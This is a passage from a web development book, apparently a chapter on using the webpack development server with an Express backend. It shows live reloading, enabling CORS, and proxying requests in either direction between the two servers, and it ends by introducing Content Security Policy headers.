<p class="normal"><span class="kobospan" id="kobo.262.1">The webpack development web server has a lot of configuration options, which are described in detail at </span><a href="https://webpack.js.org/configuration/dev-server" class="calibre3"><span class="calibre3"><span class="kobospan" id="kobo.263.1">https://webpack.js.org/configuration/dev-server</span></span></a><span class="kobospan" id="kobo.264.1">, but the default settings are well-chosen and suit most projects. </span><em class="italic"><span class="kobospan" id="kobo.265.1">Listing 7.12</span></em><span class="kobospan" id="kobo.266.1"> adds a section to the webpack configuration file for the development server.</span></p>
<p class="packt_figref"><span class="kobospan" id="kobo.267.1">Listing 7.12: Adding a section in the webpack.config.mjs file in the webapp folder</span></p>
<pre class="programlisting"><code class="hljs-code"><span class="kobospan" id="kobo.268.1">import path from "path";
import { fileURLToPath } from 'url';
const __dirname = path.dirname(fileURLToPath(import.meta.url));
export default  {
    mode: "development",
    entry: "./static/client.js",
    output: {
        path: path.resolve(__dirname, "dist/client"),
        filename: "bundle.js"
</span><strong class="screentext"><span class="kobospan" id="kobo.269.1">    },</span></strong>
<strong class="screentext"><span class="kobospan" id="kobo.270.1">    "devServer": {</span></strong>
<strong class="screentext"><span class="kobospan" id="kobo.271.1">        port: 5100,</span></strong>
<strong class="screentext"><span class="kobospan" id="kobo.272.1">        static: ["./static", "node_modules/bootstrap/dist"]</span></strong>
<strong class="screentext"><span class="kobospan" id="kobo.273.1">    }</span></strong><span class="kobospan" id="kobo.274.1">
};
</span></code></pre>
<p class="normal"><span class="kobospan" id="kobo.275.1">The </span><code class="inlinecode"><span class="kobospan" id="kobo.276.1">devServer</span></code><span class="kobospan" id="kobo.277.1"> configuration section contains the settings for the HTTP server. </span><span class="kobospan" id="kobo.277.2">The webpack server listens for HTTP requests on the port specified by the </span><code class="inlinecode"><span class="kobospan" id="kobo.278.1">port</span></code><span class="kobospan" id="kobo.279.1"> setting and responds using the files in the directories specified by the </span><code class="inlinecode"><span class="kobospan" id="kobo.280.1">static</span></code><span class="kobospan" id="kobo.281.1"> setting. </span><span class="kobospan" id="kobo.281.2">The </span><a id="_idIndexMarker371" class="calibre3"/><span class="kobospan" id="kobo.282.1">key difference is that the bundle of JavaScript sent to the browser contains additional code that opens a persistent HTTP connection back to the development server and waits for a signal. </span><span class="kobospan" id="kobo.282.2">When webpack detects that one of the files it is watching has changed, it builds a new bundle and sends the browser the signal that it has been waiting for, which loads the changed content dynamically. </span><span class="kobospan" id="kobo.282.3">This is known as </span><em class="italic"><span class="kobospan" id="kobo.283.1">live reloading</span></em><span class="kobospan" id="kobo.284.1">. </span></p>
<div class="packt_tip">
<p class="normal"><strong class="screentext"><span class="kobospan" id="kobo.285.1">Tip</span></strong></p>
<p class="normal"><span class="kobospan" id="kobo.286.1">There is a more sophisticated option available, known as </span><em class="italic"><span class="kobospan" id="kobo.287.1">hot module replacement</span></em><span class="kobospan" id="kobo.288.1">, that will attempt to update individual JavaScript modules without affecting the rest of the code or forcing the browser to reload. </span><span class="kobospan" id="kobo.288.2">See </span><a href="https://webpack.js.org/guides/hot-module-replacement" class="calibre3"><span class="calibre3"><span class="kobospan" id="kobo.289.1">https://webpack.js.org/guides/hot-module-replacement</span></span></a><span class="kobospan" id="kobo.290.1"> for details. </span></p>
</div>
<p class="normal"><em class="italic"><span class="kobospan" id="kobo.291.1">Listing 7.13</span></em><span class="kobospan" id="kobo.292.1"> changes the script used to use the webpack development HTTP server instead of watch mode. </span><span class="kobospan" id="kobo.292.2">(The addition of the </span><code class="inlinecode"><span class="kobospan" id="kobo.293.1">noClear</span></code><span class="kobospan" id="kobo.294.1"> argument to the </span><code class="inlinecode"><span class="kobospan" id="kobo.295.1">tsc-watch</span></code><span class="kobospan" id="kobo.296.1"> command stops the output from the webpack development server from being lost when the server-side code is compiled).</span></p>
<p class="packt_figref"><span class="kobospan" id="kobo.297.1">Listing 7.13: Updating the webpack script in the package.json file in the webapp folder</span></p>
<pre class="programlisting"><code class="hljs-code"><span class="kobospan" id="kobo.298.1">...
</span><span class="kobospan" id="kobo.298.2">"scripts": {
   </span><strong class="screentext"><span class="kobospan" id="kobo.299.1"> "server": "tsc-watch --noClear --onsuccess \"node dist/server.js\"",</span></strong>
<strong class="screentext"><span class="kobospan" id="kobo.300.1">    "client": "webpack serve",</span></strong><span class="kobospan" id="kobo.301.1">
    "start": "npm-run-all --parallel server client"
},
...
</span></code></pre>
<p class="normal"><span class="kobospan" id="kobo.302.1">Stop the node processes from the previous section and run </span><code class="inlinecode"><span class="kobospan" id="kobo.303.1">npm</span></code> <code class="inlinecode"><span class="kobospan" id="kobo.304.1">start</span></code><span class="kobospan" id="kobo.305.1"> in the </span><code class="inlinecode"><span class="kobospan" id="kobo.306.1">webapp</span></code><span class="kobospan" id="kobo.307.1"> folder so that the new configuration takes effect.</span></p>
<p class="normal"><span class="kobospan" id="kobo.308.1">You can </span><a id="_idIndexMarker372" class="calibre3"/><span class="kobospan" id="kobo.309.1">see the effect of the webpack development server by using the browser to request </span><code class="inlinecode"><span class="kobospan" id="kobo.310.1">http://localhost:5100</span></code><span class="kobospan" id="kobo.311.1"> (note the new port number) and using your code editor to make a change to the </span><code class="inlinecode"><span class="kobospan" id="kobo.312.1">index.html</span></code><span class="kobospan" id="kobo.313.1"> file, as shown in </span><em class="italic"><span class="kobospan" id="kobo.314.1">Listing 7.14</span></em><span class="kobospan" id="kobo.315.1">.</span></p>
<p class="packt_figref"><span class="kobospan" id="kobo.316.1">Listing 7.14: Changing an element in the index.html file in the static folder</span></p>
<pre class="programlisting"><code class="hljs-code"><span class="kobospan" id="kobo.317.1">&lt;!DOCTYPE html&gt;
&lt;html&gt;
    &lt;head&gt;
        &lt;script src="bundle.js"&gt;&lt;/script&gt;
        &lt;link href="css/bootstrap.min.css" rel="stylesheet" /&gt;
    &lt;/head&gt;
    &lt;body&gt;
       </span><strong class="screentext"><span class="kobospan" id="kobo.318.1">&lt;button id="</span></strong><strong class="screentext"><span class="kobospan" id="kobo.319.1">btn" class="btn btn-primary m-2"&gt;Send Message&lt;/button&gt;</span></strong><span class="kobospan" id="kobo.320.1">
       &lt;table class="table table-striped"&gt;
            &lt;tbody&gt;
                &lt;tr&gt;&lt;th&gt;Status&lt;/th&gt;&lt;td id="msg"&gt;&lt;/td&gt;&lt;/tr&gt;
                &lt;tr&gt;&lt;th&gt;Response&lt;/th&gt;&lt;td id="body"&gt;&lt;/td&gt;&lt;/tr&gt;
            &lt;/tbody&gt;
       &lt;/table&gt;
    &lt;/body&gt;
&lt;/html&gt;
</span></code></pre>
<p class="normal"><span class="kobospan" id="kobo.321.1">This file isn’t part of the bundle, but webpack watches files in the </span><code class="inlinecode"><span class="kobospan" id="kobo.322.1">static</span></code><span class="kobospan" id="kobo.323.1"> locations in its configuration file and will trigger an update if they change. </span><span class="kobospan" id="kobo.323.2">When you save the file, the browser will automatically reload and the new text on the button will be displayed, as shown in </span><em class="italic"><span class="kobospan" id="kobo.324.1">Figure 7.3</span></em><span class="kobospan" id="kobo.325.1">.</span></p>
<figure class="mediaobject"><span class="kobospan" id="kobo.326.1"><img alt="" src="../Images/B21959_07_03.png" class="calibre7"/></span></figure>
<p class="packt_figref"><span class="kobospan" id="kobo.327.1">Figure 7.3: An automatic update from the webpack development server</span></p>
<p class="normal"><span class="kobospan" id="kobo.328.1">Introducing </span><a id="_idIndexMarker373" class="calibre3"/><span class="kobospan" id="kobo.329.1">a server just to serve the client-side code causes problems because the webpack server has no means to respond to HTTP requests made by the client-side JavaScript code it bundles. </span><span class="kobospan" id="kobo.329.2">You can see the problem by clicking on the </span><strong class="screentext"><span class="kobospan" id="kobo.330.1">Send Message</span></strong><span class="kobospan" id="kobo.331.1"> button. </span><span class="kobospan" id="kobo.331.2">The request will fail, and the detail of the response generated by the webpack server is displayed, as shown in </span><em class="italic"><span class="kobospan" id="kobo.332.1">Figure 7.4</span></em><span class="kobospan" id="kobo.333.1">.</span></p>
<figure class="mediaobject"><span class="kobospan" id="kobo.334.1"><img alt="" src="../Images/B21959_07_04.png" class="calibre7"/></span></figure>
<p class="packt_figref"><span class="kobospan" id="kobo.335.1">Figure 7.4: Sending an HTTP request</span></p>
<p class="normal"><span class="kobospan" id="kobo.336.1">In the sections that follow, I describe three different ways this problem can be solved. </span><span class="kobospan" id="kobo.336.2">Not all approaches work in every project because client-side frameworks don’t always</span><a id="_idIndexMarker374" class="calibre3"/><span class="kobospan" id="kobo.337.1"> allow the underlying webpack configuration to be changed or they introduce specific requirements for how requests are processed. </span><span class="kobospan" id="kobo.337.2">But all frameworks can be used with at least one of these approaches and it is worth experimenting to find one that works and that suits your development style.</span></p>
<h3 class="heading2" id="_idParaDest-139"><span class="kobospan" id="kobo.338.1">Using a different request URL</span></h3>
<p class="normal1"><span class="kobospan" id="kobo.339.1">The simplest</span><a id="_idIndexMarker375" class="calibre3"/><span class="kobospan" id="kobo.340.1"> approach is to change the URL to which the client-side JavaScript code sends requests, as shown in </span><em class="italic"><span class="kobospan" id="kobo.341.1">Listing 7.15</span></em><span class="kobospan" id="kobo.342.1">. </span><span class="kobospan" id="kobo.342.2">This is a useful approach when you cannot make changes to the webpack configuration file, typically because it is hidden deep inside a framework-specific build tool. </span></p>
<p class="packt_figref"><span class="kobospan" id="kobo.343.1">Listing 7.15: Changing URL in the client.js file in the static folder</span></p>
<pre class="programlisting"><code class="hljs-code"><span class="kobospan" id="kobo.344.1">document.addEventListener('DOMContentLoaded', function() {
    document.getElementById("btn").addEventListener("click", sendReq);
});
</span><strong class="screentext"><span class="kobospan" id="kobo.345.1">const requestUrl = "http://localhost:5000/read";</span></strong><span class="kobospan" id="kobo.346.1">
sendReq = async () =&gt; {
    let payload = [];
    for (let i = 0; i &lt; 5; i++) {
        payload.push({ id: i, message: `Payload Message: ${i}\n`});
    }
 </span><strong class="screentext"><span class="kobospan" id="kobo.347.1">   const response = await fetch(requestUrl, {</span></strong><span class="kobospan" id="kobo.348.1">
        method: "POST", body: JSON.stringify(payload),
        headers: {
            "Content-Type": "application/json"
        }
    })
    document.getElementById("msg").textContent = response.statusText;
    document.getElementById("body").textContent
        = `Resp: ${await response.text()}`;
}
</span></code></pre>
<p class="normal"><span class="kobospan" id="kobo.349.1">This approach</span><a id="_idIndexMarker376" class="calibre3"/><span class="kobospan" id="kobo.350.1"> is simple and effective, but it does require changes to the server-side part of the application. </span><span class="kobospan" id="kobo.350.2">Browsers allow JavaScript code to make HTTP requests only within the same </span><em class="italic"><span class="kobospan" id="kobo.351.1">origin</span></em><span class="kobospan" id="kobo.352.1">, which means URLs that have the same scheme, host, and port as the URL used to load the JavaScript code. </span><span class="kobospan" id="kobo.352.2">The change in </span><em class="italic"><span class="kobospan" id="kobo.353.1">Listing 7.15</span></em><span class="kobospan" id="kobo.354.1"> means that the HTTP request is to a URL that is outside of the allowed origin and so the browser blocks the request. </span><span class="kobospan" id="kobo.354.2">The solution to this problem is to use </span><strong class="screentext"><span class="kobospan" id="kobo.355.1">Cross-Origin Resource Sharing</span></strong><span class="kobospan" id="kobo.356.1"> (</span><strong class="screentext"><span class="kobospan" id="kobo.357.1">CORS</span></strong><span class="kobospan" id="kobo.358.1">), in which the browser sends an additional request to the target HTTP server to determine whether it is willing to accept HTTP requests from the origin of the JavaScript code. </span></p>
<p class="normal"><span class="kobospan" id="kobo.359.1">Save the changes in </span><em class="italic"><span class="kobospan" id="kobo.360.1">Listing 7.15</span></em><span class="kobospan" id="kobo.361.1">, open the browser’s F12 developer tools, and click the </span><strong class="screentext"><span class="kobospan" id="kobo.362.1">Send Message</span></strong><span class="kobospan" id="kobo.363.1"> button in the browser window. </span><span class="kobospan" id="kobo.363.2">Ignore the message displayed in the main browser window and use the </span><strong class="screentext"><span class="kobospan" id="kobo.364.1">Network</span></strong><span class="kobospan" id="kobo.365.1"> tab of the F12 tools to see the requests the browser has made. </span><span class="kobospan" id="kobo.365.2">You will see a request that uses the HTTP </span><code class="inlinecode"><span class="kobospan" id="kobo.366.1">OPTIONS</span></code><span class="kobospan" id="kobo.367.1"> method, which is known as the </span><em class="italic"><span class="kobospan" id="kobo.368.1">pre-flight request</span></em><span class="kobospan" id="kobo.369.1">, as shown in </span><em class="italic"><span class="kobospan" id="kobo.370.1">Figure 7.5</span></em><span class="kobospan" id="kobo.371.1">, and which allows the backend server to indicate whether it will accept the request.</span></p>
<figure class="mediaobject"><span class="kobospan" id="kobo.372.1"><img alt="" src="../Images/B21959_07_05.png" class="calibre7"/></span></figure>
<p class="packt_figref"><span class="kobospan" id="kobo.373.1">Figure 7.5: The preflight request</span></p>
<p class="normal"><span class="kobospan" id="kobo.374.1">The response</span><a id="_idIndexMarker377" class="calibre3"/><span class="kobospan" id="kobo.375.1"> from the backend server did not include the </span><code class="inlinecode"><span class="kobospan" id="kobo.376.1">Access-Control-Allow-Origin</span></code><span class="kobospan" id="kobo.377.1"> header, which would have indicated that cross-origin requests are allowed, and so the browser blocks the POST request.</span></p>
<p class="normal"><span class="kobospan" id="kobo.378.1">CORS is described in </span><a id="_idIndexMarker378" class="calibre3"/><span class="kobospan" id="kobo.379.1">detail at </span><a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS" class="calibre3"><span class="calibre3"><span class="kobospan" id="kobo.380.1">https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS</span></span></a><span class="kobospan" id="kobo.381.1">, and you can use the Node.js API described in </span><em class="italic"><span class="kobospan" id="kobo.382.1">Chapter 5</span></em><span class="kobospan" id="kobo.383.1"> to set the headers required to allow client requests. </span><span class="kobospan" id="kobo.383.2">A simpler approach is to use one of the many JavaScript packages available to manage</span><a id="_idIndexMarker379" class="calibre3"/><span class="kobospan" id="kobo.384.1"> CORS. </span><span class="kobospan" id="kobo.384.2">Run the command shown in </span><em class="italic"><span class="kobospan" id="kobo.385.1">Listing 7.16</span></em><span class="kobospan" id="kobo.386.1"> in the </span><code class="inlinecode"><span class="kobospan" id="kobo.387.1">webapp</span></code><span class="kobospan" id="kobo.388.1"> folder to install a CORS package for Express and a package that describes the API it provides for the TypeScript compiler.</span></p>
<p class="packt_figref"><span class="kobospan" id="kobo.389.1">Listing 7.16: Installing the CORS package and type descriptions</span></p>
<pre class="programlisting1"><code class="hljs-con"><span class="kobospan" id="kobo.390.1">npm install cors@2.8.5
npm install --save-dev @types/cors@2.8.16
</span></code></pre>
<p class="normal"><em class="italic"><span class="kobospan" id="kobo.391.1">Listing 7.17</span></em><span class="kobospan" id="kobo.392.1"> configures Express to use the new package to allow cross-origin requests.</span></p>
<p class="packt_figref"><span class="kobospan" id="kobo.393.1">Listing 7.17. </span><span class="kobospan" id="kobo.393.2">Allowing cross-origin requests in the server.Ts file in the src folder</span></p>
<pre class="programlisting"><code class="hljs-code"><span class="kobospan" id="kobo.394.1">import { createServer } from "http";
import express, {Express } from "express";
import { readHandler } from "./readHandler";
</span><strong class="screentext"><span class="kobospan" id="kobo.395.1">import cors from "cors";</span></strong><span class="kobospan" id="kobo.396.1">
const port = 5000;
const expressApp: Express = express();
</span><strong class="screentext"><span class="kobospan" id="kobo.397.1">expressApp.use(cors({</span></strong>
<strong class="screentext"><span class="kobospan" id="kobo.398.1">    origin: "http://localhost:5100"</span></strong>
<strong class="screentext"><span class="kobospan" id="kobo.399.1">}));</span></strong><span class="kobospan" id="kobo.400.1">
expressApp.use(express.json());
expressApp.post("/read", readHandler);
expressApp.use(express.static("static"));
expressApp.use(express.static("node_modules/bootstrap/dist"));
expressApp.use(express.static("dist/client"));
const server = createServer(expressApp);
server.listen(port,
    () =&gt; console.log(`HTTP Server listening on port ${port}`));
</span></code></pre>
<p class="normal"><span class="kobospan" id="kobo.401.1">The </span><a id="_idIndexMarker380" class="calibre3"/><span class="kobospan" id="kobo.402.1">CORS package contains an Express middleware package that is applied with the </span><code class="inlinecode"><span class="kobospan" id="kobo.403.1">use</span></code><span class="kobospan" id="kobo.404.1"> method. </span><span class="kobospan" id="kobo.404.2">The full set of CORS configuration options can be found at </span><a href="https://github.com/expressjs/cors" class="calibre3"><span class="calibre3"><span class="kobospan" id="kobo.405.1">https://github.com/expressjs/cors</span></span></a><span class="kobospan" id="kobo.406.1"> and </span><em class="italic"><span class="kobospan" id="kobo.407.1">Listing 7.17</span></em><span class="kobospan" id="kobo.408.1"> uses the </span><code class="inlinecode"><span class="kobospan" id="kobo.409.1">origin</span></code><span class="kobospan" id="kobo.410.1"> configuration setting to specify that requests are allowed from </span><code class="inlinecode"><span class="kobospan" id="kobo.411.1">http://localhost:5100</span></code><span class="kobospan" id="kobo.412.1">, which will allow requests from JavaScript code loaded from the webpack development server.</span></p>
<p class="normal"><span class="kobospan" id="kobo.413.1">Dismiss the error message displayed in the browser window (you can click the cross icon or reload the browser) and click the </span><code class="inlinecode"><span class="kobospan" id="kobo.414.1">Send Message</span></code><span class="kobospan" id="kobo.415.1"> button again. </span><span class="kobospan" id="kobo.415.2">This time, the backend server will respond to the OPTIONS request with the headers the browser is expecting, and the HTTP POST request will be allowed. </span><span class="kobospan" id="kobo.415.3">The </span><em class="italic"><span class="kobospan" id="kobo.416.1">F12</span></em><span class="kobospan" id="kobo.417.1"> tools will </span><a id="_idIndexMarker381" class="calibre3"/><span class="kobospan" id="kobo.418.1">display details of the successful request, as shown in </span><em class="italic"><span class="kobospan" id="kobo.419.1">Figure 7.6</span></em><span class="kobospan" id="kobo.420.1">.</span></p>
<figure class="mediaobject"><span class="kobospan" id="kobo.421.1"><img alt="" src="../Images/B21959_07_06.png" class="calibre7"/></span></figure>
<p class="packt_figref"><span class="kobospan" id="kobo.422.1">Figure 7.6: Using CORS to allow cross-origin requests</span></p>
<h3 class="heading2" id="_idParaDest-140"><span class="kobospan" id="kobo.423.1">Forwarding requests from webpack to the backend server</span></h3>
<p class="normal1"><span class="kobospan" id="kobo.424.1">A more</span><a id="_idIndexMarker382" class="calibre3"/><span class="kobospan" id="kobo.425.1"> sophisticated solution is to configure the webpack development server so that it forwards requests to the backend server. </span><span class="kobospan" id="kobo.425.2">The request forwarding isn’t apparent to the browser, which means that all requests are sent to the same origin and CORS isn’t required. </span><em class="italic"><span class="kobospan" id="kobo.426.1">Listing 7.18</span></em><span class="kobospan" id="kobo.427.1"> updates the webpack configuration file to add support for forwarding requests. </span><a id="_idIndexMarker383" class="calibre3"/></p>
<p class="packt_figref"><span class="kobospan" id="kobo.428.1">Listing 7.18: Adding a setting in the webpack.config.mjs file in the webapp folder</span></p>
<pre class="programlisting"><code class="hljs-code"><span class="kobospan" id="kobo.429.1">import path from "path";
import { fileURLToPath } from 'url';
const __dirname = path.dirname(fileURLToPath(import.meta.url));
export default  {
    mode: "development",
    entry: "./static/client.js",
    output: {
        path: path.resolve(__dirname, "dist/client"),
        filename: "bundle.js"
    },
    "devServer": {
        port: 5100,
        static: ["./static", "node_modules/bootstrap/dist"],
        </span><strong class="screentext"><span class="kobospan" id="kobo.430.1">proxy: {</span></strong>
<strong class="screentext"><span class="kobospan" id="kobo.431.1">            "/read": "http://localhost:5000"</span></strong>
<strong class="screentext"><span class="kobospan" id="kobo.432.1">        }</span></strong><span class="kobospan" id="kobo.433.1">
    }
};
</span></code></pre>
<p class="normal"><span class="kobospan" id="kobo.434.1">The </span><code class="inlinecode"><span class="kobospan" id="kobo.435.1">proxy</span></code><span class="kobospan" id="kobo.436.1"> setting</span><a id="_idIndexMarker384" class="calibre3"/><span class="kobospan" id="kobo.437.1"> is used to specify one or more paths and the URLs to which they should be forwarded. </span><em class="italic"><span class="kobospan" id="kobo.438.1">Listing 7.19</span></em><span class="kobospan" id="kobo.439.1"> updates the client-side JavaScript code so that requests are sent relative to the JavaScript file’s origin.</span></p>
<p class="packt_figref"><span class="kobospan" id="kobo.440.1">Listing 7.19: Using relative URLs in the client.js file in the static folder</span></p>
<pre class="programlisting"><code class="hljs-code"><span class="kobospan" id="kobo.441.1">document.addEventListener('DOMContentLoaded', function() {
    document.getElementById("btn").addEventListener("click", sendReq);
});
</span><strong class="screentext"><span class="kobospan" id="kobo.442.1">const requestUrl = "/read";</span></strong><span class="kobospan" id="kobo.443.1">
sendReq = async () =&gt; {
    let payload = [];
    for (let i = 0; i &lt; 5; i++) {
        payload.push({ id: i, message: `Payload Message: ${i}\n`});
    }
    const response = await fetch(requestUrl, {
        method: "POST", body: JSON.stringify(payload),
        headers: {
            "Content-Type": "application/json"
        }
    })
    document.getElementById("msg").textContent = response.statusText;
    document.getElementById("body").textContent
        = `Resp: ${await response.text()}`;
}
</span></code></pre>
<p class="normal"><span class="kobospan" id="kobo.444.1">webpack </span><a id="_idIndexMarker385" class="calibre3"/><span class="kobospan" id="kobo.445.1">doesn’t pick up changes to its configuration file automatically. </span><span class="kobospan" id="kobo.445.2">Use </span><em class="italic"><span class="kobospan" id="kobo.446.1">Control+C</span></em><span class="kobospan" id="kobo.447.1"> to stop the existing process and then run the </span><code class="inlinecode"><span class="kobospan" id="kobo.448.1">npm start</span></code><span class="kobospan" id="kobo.449.1"> command in the </span><code class="inlinecode"><span class="kobospan" id="kobo.450.1">webapp</span></code><span class="kobospan" id="kobo.451.1"> folder to start </span><code class="inlinecode"><span class="kobospan" id="kobo.452.1">webpack</span></code><span class="kobospan" id="kobo.453.1"> and the backend server again. </span><span class="kobospan" id="kobo.453.2">Use a browser to request </span><code class="inlinecode"><span class="kobospan" id="kobo.454.1">http://localhost:5100</span></code><span class="kobospan" id="kobo.455.1"> (the URL for the webpack server) and then click the </span><strong class="screentext"><span class="kobospan" id="kobo.456.1">Send Message</span></strong><span class="kobospan" id="kobo.457.1"> button. </span><span class="kobospan" id="kobo.457.2">The webpack server will receive the request and act as a proxy to get a response from the backend server, producing the response shown in </span><em class="italic"><span class="kobospan" id="kobo.458.1">Figure 7.7</span></em><span class="kobospan" id="kobo.459.1">.</span></p>
<figure class="mediaobject"><span class="kobospan" id="kobo.460.1"><img alt="" src="../Images/B21959_07_07.png" class="calibre7"/></span></figure>
<p class="packt_figref"><span class="kobospan" id="kobo.461.1">Figure 7.7: Using webpack as a proxy for the backend server</span></p>
<div class="packt_tip">
<p class="normal"><strong class="screentext"><span class="kobospan" id="kobo.462.1">Tip</span></strong></p>
<p class="normal"><span class="kobospan" id="kobo.463.1">Behind the scenes, the webpack HTTP server uses Express and the core development server functionality is available in the </span><code class="inlinecode"><span class="kobospan" id="kobo.464.1">webpack-dev-middleware</span></code><span class="kobospan" id="kobo.465.1"> package, which can be used as middleware in any project that also uses Express. </span><span class="kobospan" id="kobo.465.2">I have not demonstrated this feature because it requires additional packages and extensive configuration changes to recreate features like live reloading, which are already set up when using the standard webpack development server package.</span></p>
<p class="normal"><span class="kobospan" id="kobo.466.1">See </span><a href="https://webpack.js.org/guides/development/#using-webpack-dev-middleware" class="calibre3"><span class="calibre3"><span class="kobospan" id="kobo.467.1">https://webpack.js.org/guides/development/#using-webpack-dev-middleware</span></span></a><span class="kobospan" id="kobo.468.1"> for details of using webpack as Express middleware.</span></p>
</div>
<h3 class="heading2" id="_idParaDest-141"><span class="kobospan" id="kobo.469.1">Forwarding requests from the backend server to webpack</span></h3>
<p class="normal1"><span class="kobospan" id="kobo.470.1">The </span><a id="_idIndexMarker386" class="calibre3"/><span class="kobospan" id="kobo.471.1">third approach is to switch the servers around so that the backend server forwards requests to the webpack server. </span><span class="kobospan" id="kobo.471.2">This has the advantage of making the development environment more consistent with production and ensures that headers set by the backend server are applied. </span><span class="kobospan" id="kobo.471.3">Run the commands shown in </span><em class="italic"><span class="kobospan" id="kobo.472.1">Listing 7.20</span></em><span class="kobospan" id="kobo.473.1"> in the </span><code class="inlinecode"><span class="kobospan" id="kobo.474.1">webapp</span></code><span class="kobospan" id="kobo.475.1"> folder to install a proxy package for Express and a description of the API it provides for the TypeScript compiler. </span></p>
<p class="packt_figref"><span class="kobospan" id="kobo.476.1">Listing 7.20: Installing a proxy package</span></p>
<pre class="programlisting1"><code class="hljs-con"><span class="kobospan" id="kobo.477.1">npm install http-proxy@1.18.1
</span></code></pre>
<p class="normal"><em class="italic"><span class="kobospan" id="kobo.478.1">Listing 7.21</span></em><span class="kobospan" id="kobo.479.1"> changes the Express configuration so that requests are forwarded to the webpack server.</span></p>
<p class="packt_figref"><span class="kobospan" id="kobo.480.1">Listing 7.21: Forwarding requests in the server.ts file in the src folder</span></p>
<pre class="programlisting"><code class="hljs-code"><span class="hljs-keyword"><span class="kobospan" id="kobo.481.1">i</span></span><span class="kobospan" id="kobo.482.1">mport { createServer } from "http";
import express, {Express } from "express";
import { readHandler } from "./readHandler";
import cors from "cors";
</span><strong class="screentext"><span class="kobospan" id="kobo.483.1">import httpProxy from "http-proxy";</span></strong><span class="kobospan" id="kobo.484.1">
const port = 5000;
const expressApp: Express = express();
</span><strong class="screentext"><span class="kobospan" id="kobo.485.1">const proxy = httpProxy.createProxyServer({</span></strong>
<strong class="screentext"><span class="kobospan" id="kobo.486.1">    target: "http://localhost:5100", ws: true</span></strong>
<strong class="screentext"><span class="kobospan" id="kobo.487.1">});</span></strong><span class="kobospan" id="kobo.488.1">
expressApp.use(cors({
    origin: "http://localhost:5100"
}));
expressApp.use(express.json());
expressApp.post("/read", readHandler);
expressApp.use(express.static("static"));
expressApp.use(express.static("node_modules/bootstrap/dist"));
</span><strong class="screentext"><span class="kobospan" id="kobo.489.1">//expressApp.use(express.static("dist/client"));</span></strong>
<strong class="screentext"><span class="kobospan" id="kobo.490.1">expressApp.use((req, resp) =&gt; proxy.web(req, resp));</span></strong><span class="kobospan" id="kobo.491.1">
const server = createServer(expressApp);
</span><strong class="screentext"><span class="kobospan" id="kobo.492.1">server.on('upgrade', (req, socket, head) =&gt; proxy.ws(req, socket, head));</span></strong><span class="kobospan" id="kobo.493.1">
server.listen(port,
    () =&gt; console.log(`HTTP Server listening on port ${port}`));
</span></code></pre>
<p class="normal"><span class="kobospan" id="kobo.494.1">The</span><a id="_idIndexMarker387" class="calibre3"/><span class="kobospan" id="kobo.495.1"> changes enable the proxy, including support for dealing with web socket requests, which are used for the live reload feature, and which must also be forwarded to the webpack development server. </span><span class="kobospan" id="kobo.495.2">A corresponding update is required in the webpack configuration file to specify the URL that the client-side live reloading code will connect to, as shown in </span><em class="italic"><span class="kobospan" id="kobo.496.1">Listing 7.22</span></em><span class="kobospan" id="kobo.497.1">.</span></p>
<p class="packt_figref"><span class="kobospan" id="kobo.498.1">Listing 7.22: Changing the client-side URL in the webpack.config.mjs file</span></p>
<pre class="programlisting"><code class="hljs-code"><span class="kobospan" id="kobo.499.1">import path from "path";
import { fileURLToPath } from 'url';
const __dirname = path.dirname(fileURLToPath(import.meta.url));
export default  {
    mode: "development",
    entry: "./static/client.js",
    output: {
        path: path.resolve(__dirname, "dist/client"),
        filename: "bundle.js"
    },
    "devServer": {
        port: 5100,
        static: ["./static", "node_modules/bootstrap/dist"],
        </span><strong class="screentext"><span class="kobospan" id="kobo.500.1">// proxy: {</span></strong>
<strong class="screentext"><span class="kobospan" id="kobo.501.1">        //     "/read": "http://localhost:5000"</span></strong>
<strong class="screentext"><span class="kobospan" id="kobo.502.1">        // },</span></strong>
<strong class="screentext"><span class="kobospan" id="kobo.503.1">        client: {</span></strong>
<strong class="screentext"><span class="kobospan" id="kobo.504.1">            webSocketURL</span></strong><strong class="screentext"><span class="kobospan" id="kobo.505.1">: "http://localhost:5000/ws"</span></strong>
<strong class="screentext"><span class="kobospan" id="kobo.506.1">        }</span></strong><span class="kobospan" id="kobo.507.1">
    }
};
</span></code></pre>
<p class="normal"><span class="kobospan" id="kobo.508.1">Use </span><em class="italic"><span class="kobospan" id="kobo.509.1">Control+C</span></em><span class="kobospan" id="kobo.510.1"> to stop the existing build process and run </span><code class="inlinecode"><span class="kobospan" id="kobo.511.1">npm start</span></code><span class="kobospan" id="kobo.512.1"> in the </span><code class="inlinecode"><span class="kobospan" id="kobo.513.1">webapp</span></code><span class="kobospan" id="kobo.514.1"> folder so </span><a id="_idIndexMarker388" class="calibre3"/><span class="kobospan" id="kobo.515.1">that the changes take effect. </span><span class="kobospan" id="kobo.515.2">Use a browser to request </span><code class="inlinecode"><span class="kobospan" id="kobo.516.1">http://localhost:5000</span></code><span class="kobospan" id="kobo.517.1">, as shown in </span><em class="italic"><span class="kobospan" id="kobo.518.1">Figure 7.8</span></em><span class="kobospan" id="kobo.519.1">, to have the backend server receive the request and still benefit from the features of the webpack development server.</span></p>
<figure class="mediaobject"><span class="kobospan" id="kobo.520.1"><img alt="" src="../Images/B21959_07_08.png" class="calibre7"/></span></figure>
<p class="packt_figref"><span class="kobospan" id="kobo.521.1">Figure 7.8: Using the backend server as a proxy for webpack</span></p>
<h1 class="heading" id="_idParaDest-142"><span class="kobospan" id="kobo.522.1">Using a content security policy</span></h1>
<p class="normal1"><span class="kobospan" id="kobo.523.1">CORS is an</span><a id="_idIndexMarker389" class="calibre3"/><span class="kobospan" id="kobo.524.1"> example of a set of request headers that were introduced to address malicious behavior by providing the browser with information about how the application is expected to work. </span></p>
<p class="normal"><span class="kobospan" id="kobo.525.1">There are </span><a id="_idIndexMarker390" class="calibre3"/><span class="kobospan" id="kobo.526.1">additional headers that the backend server can set to provide the browser with insight into how the application works and what behaviors are expected. </span><span class="kobospan" id="kobo.526.2">The most important header is </span><code class="inlinecode"><span class="kobospan" id="kobo.527.1">Content-Security-Policy</span></code><span class="kobospan" id="kobo.528.1">, which the backend server uses to describe the application’s </span><strong class="screentext"><span class="kobospan" id="kobo.529.1">Content Security Policy</span></strong><span class="kobospan" id="kobo.530.1"> (</span><strong class="screentext"><span class="kobospan" id="kobo.531.1">CSP</span></strong><span class="kobospan" id="kobo.532.1">). </span><span class="kobospan" id="kobo.532.2">The CSP tells the browser what behaviors to expect from the client-side application so that the browser can block suspicious activity.</span></p>
